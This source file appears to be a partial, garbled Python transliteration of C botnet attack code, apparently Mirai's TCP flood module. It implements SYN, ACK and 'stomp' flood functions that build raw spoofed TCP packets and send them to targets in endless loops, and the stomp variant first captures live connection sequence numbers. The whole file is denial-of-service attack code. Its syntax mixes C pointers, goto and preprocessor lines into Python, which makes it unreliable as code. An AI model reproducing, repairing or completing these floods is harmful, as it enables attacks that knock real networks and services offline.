import os, fcntl
_GNU_SOURCE	= #ifdef DEBUG
import sys
#endif
import <unistd.h>
import <sys/socket.h>
import <linux/ip.h>
import <linux/tcp.h>
import <fcntl.h>
import <errno.h>

import checksum_h_header
import includes_h_header
import attack_h_header
import protocol_h_header
import util_h_header
import checksum_h_header
import rand_h_header
import util_c

# predefined functions from imported modules
https_transport = includes_h_header.https_transport
dns_resolver = includes_h_header.dns_resolver
ipv4_t = includes_h_header.ipv4_t
htonl = includes_h_header.htonl
INET_ADDR = includes_h_header.INET_ADDR
xputc = includes_h_header.xputc
xputs = includes_h_header.xputs
va_list = includes_h_header.va_list
va_start = includes_h_header.va_start
va_end = includes_h_header.va_end
xvprintf = includes_h_header.xvprintf
xprintf = includes_h_header.xprintf
attack_target = attack_h_header.attack_target
attack_option = attack_h_header.attack_option
attack_method = attack_h_header.attack_method
attack_stomp_data = attack_h_header.attack_stomp_data
attack_http_state = attack_h_header.attack_http_state
attack_cfnull_state = attack_h_header.attack_cfnull_state
add_attack = attack_h_header.add_attack
free_opts = attack_h_header.free_opts
table_value = table_h_header.table_value
# DEBUG: This is how you generate these lines automatically, example...
# DEBUG: cat util_c.py | egrep -i 'def|class' | egrep -vi '#' | cut -d \( -f 1 | awk '{print $2" = util_c."$2}'
util_strlen = util_c.util_strlen
util_strncmp = util_c.util_strncmp
util_strcmp = util_c.util_strcmp
util_strcpy = util_c.util_strcpy
util_memcpy = util_c.util_memcpy
util_zero = util_c.util_zero
util_atoi = util_c.util_atoi
util_itoa = util_c.util_itoa
util_memsearch = util_c.util_memsearch
util_stristr = util_c.util_stristr
util_fdgets = util_c.util_fdgets
util_isupper = util_c.util_isupper
util_isalpha = util_c.util_isalpha
util_isspace = util_c.util_isspace
util_isdigit = util_c.util_isdigit

def attack_tcp_syn(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
    def dont_frag():
        attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
    	return True
    def urg_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
    	return False
    def ack_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, False)
    	return False
    def psh_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
    	return False
    def rst_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
    	return False
    def syn_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, True)
    	return True
    def fin_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
    	return False
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    # BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
    dont_frag()
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    seq = attack_get_opt_int(opts_len; 0xffff)
    ack = attack_get_opt_int(opts_len; 0)
    # BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
    # BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, False)
    # BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
    # BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
    # BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, True)
    # BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
    # According to this code, it says the DEFAULT attack is a SYN flood with no fragmentation of the packets
    urg_fl()
    ack_fl()
    psh_fl()
    rst_fl()
    syn_fl()
    fin_fl()
    source_ip = attack_get_opt_ip(opts_len; LOCAL_ADDR)

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return

    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        struct iphdr *iph
        struct tcphdr *tcph
        iphdr(iph)
        tcphdr(tcph)

        pkts[i] = calloc(128, sizeof (char))
        # iph = (struct iphdr *)pkts[i]
        # tcph = (struct tcphdr *)(iph + 1)
        # opts = ()(tcph + 1)
        iph = iphdr(pkts[i])
        tcph = tcphdr(iph+1)
        opts = tcph + 1

        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        iph.tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20)
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_TCP
        iph.saddr = source_ip
        iph.daddr = targs[i].addr

        tcph.source = htons(sport)
        tcph.dest = htons(dport)
        tcph.seq = htons(seq)
        tcph.doff = 10
        tcph.urg = urg_fl
        tcph.ack = ack_fl
        tcph.psh = psh_fl
        tcph.rst = rst_fl
        tcph.syn = syn_fl
        tcph.fin = fin_fl

        # TCP MSS
        *opts++ = PROTO_TCP_OPT_MSS    # Kind
        *opts++ = 4                    # Length
        *(()opts) = htons(1400 + (rand_next() & 0x0f))
        opts += sizeof (uint16_t)

        # TCP SACK permitted
        *opts++ = PROTO_TCP_OPT_SACK
        *opts++ = 2

        # TCP timestamps
        *opts++ = PROTO_TCP_OPT_TSVAL
        *opts++ = 10
        *(()opts) = rand_next()
        opts += sizeof (uint32_t)
        *(()opts) = 0
        opts += sizeof (uint32_t)

        # TCP nop
        *opts++ = 1

        # TCP window scale
        *opts++ = PROTO_TCP_OPT_WSS
        *opts++ = 3
        *opts++ = 6 # 2^6 = 64, window size scale = 64

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            # struct iphdr *iph = (struct iphdr *)pkt
            # struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
            iphdr(iph) = iphdr(pkt)
            tcphdr(tcph) = tcphdr(iph+1)

            # For prefix attacks
            if targs[i].netmask < 32:
                iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

            if source_ip == 0xffffffff:
                iph.saddr = rand_next()
            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff
            if sport == 0xffff:
                tcph.source = rand_next() & 0xffff
            if dport == 0xffff:
                tcph.dest = rand_next() & 0xffff
            if seq == 0xffff:
                tcph.seq = rand_next()
            if ack == 0xffff:
                tcph.ack_seq = rand_next()
            if urg_fl:
                tcph.urg_ptr = rand_next() & 0xffff

            iph.check = 0
            iph.check = checksum_generic(()iph, sys.getsizeof (iphdr))

            tcph.check = 0
            tcph.check = checksum_tcpudp(iph, tcph, htons(sys.getsizeof (tcphdr) + 20), sys.getsizeof (tcphdr) + 20)

            targs[i].sock_addr.sin_port = tcph.dest
            sendto(fd, pkt, sys.getsizeof (iphdr) + sys.getsizeof (tcphdr) + 20, MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sys.getsizeof (sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif

# def attack_tcp_ack(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
def attack_tcp_ack(targs_len,attack_target(targs,opts_len),attack_option(opts)):
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, False)
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
    seq = attack_get_opt_int(opts_len; 0xffff)
    ack = attack_get_opt_int(opts_len; 0xffff)
    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, True)
    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, False)
    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
    data_len = attack_get_opt_int(opts_len; 512)
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
    source_ip = attack_get_opt_ip(opts_len; LOCAL_ADDR)

    if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n")
#endif
        return
    i = 1
    if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(fd)
        return

    for i in range(targs_len):
        # struct iphdr *iph
        # struct tcphdr *tcph
        iphdr(iph)
        tcphdr(tcph)

        pkts[i] = calloc(1510, sizeof (char))
        # iph = (struct iphdr *)pkts[i]
        # tcph = (struct tcphdr *)(iph + 1)
        payload = ()(tcph + 1)
        iph = iphdr(pkts[i])
        tcph = tcphdr(iph+1)


        iph.version = 4
        iph.ihl = 5
        iph.tos = ip_tos
        iph.tot_len = htons(sizeof (iphdr) + sizeof (tcphdr) + data_len)
        iph.id = htons(ip_ident)
        iph.ttl = ip_ttl
        if dont_frag:
            iph.frag_off = htons(1 << 14)
        iph.protocol = IPPROTO_TCP
        iph.saddr = source_ip
        iph.daddr = targs[i].addr

        tcph.source = htons(sport)
        tcph.dest = htons(dport)
        tcph.seq = htons(seq)
        tcph.doff = 5
        tcph.urg = urg_fl
        tcph.ack = ack_fl
        tcph.psh = psh_fl
        tcph.rst = rst_fl
        tcph.syn = syn_fl
        tcph.fin = fin_fl
        tcph.window = rand_next() & 0xffff
        if psh_fl:
            tcph.psh = True

        rand_str(payload, data_len)

#    targs[0].sock_addr.sin_port = tcph->dest
#    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
#    {
#
#    }

    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            # struct iphdr *iph = (struct iphdr *)pkt
            # struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
            iphdr(iph) = iphdr(pkt)
            tcphdr(tcph) = tcphdr(iph+1)
            data = ()(tcph + 1)

            # For prefix attacks
            if targs[i].netmask < 32:
                iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))

            if source_ip == 0xffffffff:
                iph.saddr = rand_next()
            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff
            if sport == 0xffff:
                tcph.source = rand_next() & 0xffff
            if dport == 0xffff:
                tcph.dest = rand_next() & 0xffff
            if seq == 0xffff:
                tcph.seq = rand_next()
            if ack == 0xffff:
                tcph.ack_seq = rand_next()

            # Randomize packet content?
            if data_rand:
                rand_str(data, data_len)

            iph.check = 0
            iph.check = checksum_generic(()iph, sizeof (iphdr))

            tcph.check = 0
            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (tcphdr) + data_len), sizeof (tcphdr) + data_len)

            targs[i].sock_addr.sin_port = tcph.dest
            sendto(fd, pkt, sizeof (iphdr) + sizeof (tcphdr) + data_len, MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sizeof (sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif

# def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
def attack_tcp_stomp(targs_len, attack_target(targs,opts_len), attack_option(opts)):
    # struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data))
    def dont_frag():
        attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
    	return True
    def urg_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
    	return False
    def ack_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, False)
    	return False
    def psh_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
    	return False
    def rst_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
    	return False
    def syn_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, True)
    	return True
    def fin_fl():
        attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
    	return False
    def data_rand():
        attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, True)
        return True
    attack_stomp_data(stomp_data) = calloc(targs_len, sys.getsizeof(attack_stomp_data))
    pkts = calloc(targs_len; sizeof ())
    ip_tos = attack_get_opt_int(opts_len; 0)
    ip_ident = attack_get_opt_int(opts_len; 0xffff)
    ip_ttl = attack_get_opt_int(opts_len; 64)
    # BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
    dont_frag()
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)

    urg_fl()
    ack_fl()
    psh_fl()
    rst_fl()
    syn_fl()
    fin_fl()
    data_len = attack_get_opt_int(opts_len; 768)
    data_rand()
    # Set up receive socket
    if (rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
#ifdef DEBUG
        printf("Could not open raw socket!\n")
#endif
        return
    i = 1
    if setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n")
#endif
        os.close(rfd)
        return

    # Retrieve all ACK/SEQ numbers
    for i in range(targs_len):
        # struct sockaddr_in addr, recv_addr
        sockaddr_in(addr, recv_addr)
        socklen_t(recv_addr_len)
        # socklen_t recv_addr_len

        stomp_setup_nums:

        if (fd = socket(AF_INET, SOCK_STREAM, 0)) == -1:
#ifdef DEBUG
            printf("Failed to create socket!\n")
#endif
            continue

        # Set it in nonblocking mode
        fcntl.fcntl(fd, F_SETFL, fcntl.fcntl(fd, F_GETFL, 0) | os.O_NONBLOCK)

        # Set up address to connect to
        addr.sin_family = AF_INET
        if targs[i].netmask < 32:
            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))
        else:
            addr.sin_addr.s_addr = targs[i].addr
        if dport == 0xffff:
            addr.sin_port = rand_next() & 0xffff
        else:
            addr.sin_port = htons(dport)

        # Actually connect, nonblocking
        # connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in))
        connect(
            fd,
            sockaddr(addr),
            sys.getsizeof(sockaddr_in)
        )
        start_recv = time.time()

        # Get info
        while True:

            # recv_addr_len = sizeof (struct sockaddr_in)
            recv_addr_len = sys.getsizeof(sockaddr_in)
            # ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len)
            ret = recvfrom(
                rfd,
                pktbuf,
                sys.getsizeof(pktbuf),
                MSG_NOSIGNAL,
                sockaddr(recv_addr, recv_addr_len)
            )
            if ret == -1:
#ifdef DEBUG
                printf("Could not listen on raw socket!\n")
#endif
                return
            if recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr and ret > (sizeof (iphdr) + sizeof (tcphdr)):
                # struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr))
                tcphdr(tcph) = tcphdr(pktbuf + sys.getsizeof(iphdr))

                if tcph.source == addr.sin_port:
                    if tcph.syn and tcph.ack:
                        # struct iphdr *iph
                        # struct tcphdr *tcph
                        iphdr(iph)
                        tcphdr(tcph)

                        stomp_data[i].addr = addr.sin_addr.s_addr
                        stomp_data[i].seq = ntohl(tcph.seq)
                        stomp_data[i].ack_seq = ntohl(tcph.ack_seq)
                        stomp_data[i].sport = tcph.dest
                        stomp_data[i].dport = addr.sin_port
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n")
#endif
                        # Set up the packet
                        pkts[i] = malloc(sizeof (iphdr) + sizeof (tcphdr) + data_len)
                        # iph = (struct iphdr *)pkts[i]
                        # tcph = (struct tcphdr *)(iph + 1)
                        iph = iphdr(pkts[i])
                        tcph = tcphdr(iph+1)
                        payload = ()(tcph + 1)

                        iph.version = 4
                        iph.ihl = 5
                        iph.tos = ip_tos
                        iph.tot_len = htons(sizeof (iphdr) + sizeof (tcphdr) + data_len)
                        iph.id = htons(ip_ident)
                        iph.ttl = ip_ttl
                        if dont_frag:
                            iph.frag_off = htons(1 << 14)
                        iph.protocol = IPPROTO_TCP
                        iph.saddr = LOCAL_ADDR
                        iph.daddr = stomp_data[i].addr

                        tcph.source = stomp_data[i].sport
                        tcph.dest = stomp_data[i].dport
                        tcph.seq = stomp_data[i].ack_seq
                        tcph.ack_seq = stomp_data[i].seq
                        tcph.doff = 8
                        tcph.fin = True
                        tcph.ack = True
                        tcph.window = rand_next() & 0xffff
                        tcph.urg = urg_fl
                        tcph.ack = ack_fl
                        tcph.psh = psh_fl
                        tcph.rst = rst_fl
                        tcph.syn = syn_fl
                        tcph.fin = fin_fl

                        rand_str(payload, data_len)
                        break
                    elif tcph.fin or tcph.rst:
                        os.close(fd)
                        goto stomp_setup_nums

            if time.time() - start_recv > 10:
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n")
#endif
                os.close(fd)
                goto stomp_setup_nums

    # Start spewing out traffic
    while True:
        for i in range(targs_len):
            pkt = pkts[i]
            # struct iphdr *iph = (struct iphdr *)pkt
            # struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
            iphdr(iph) = iphdr(pkt)
            tcphdr(tcph) = tcphdr(iph+1)
            data = ()(tcph + 1)

            if ip_ident == 0xffff:
                iph.id = rand_next() & 0xffff

            if data_rand:
                rand_str(data, data_len)

            iph.check = 0
            iph.check = checksum_generic(()iph, sizeof (iphdr))

            tcph.seq = htons(stomp_data[i].seq++)
            tcph.ack_seq = htons(stomp_data[i].ack_seq)
            tcph.check = 0
            tcph.check = checksum_tcpudp(iph, tcph, htons(sizeof (tcphdr) + data_len), sizeof (tcphdr) + data_len)

            targs[i].sock_addr.sin_port = tcph.dest
            sendto(rfd, pkt, sizeof (iphdr) + sizeof (tcphdr) + data_len, MSG_NOSIGNAL, (sockaddr *)&targs[i].sock_addr, sizeof (sockaddr_in))
#ifdef DEBUG
            break
            if errno != 0:
                printf("errno = %d\n" % (errno))
#endif
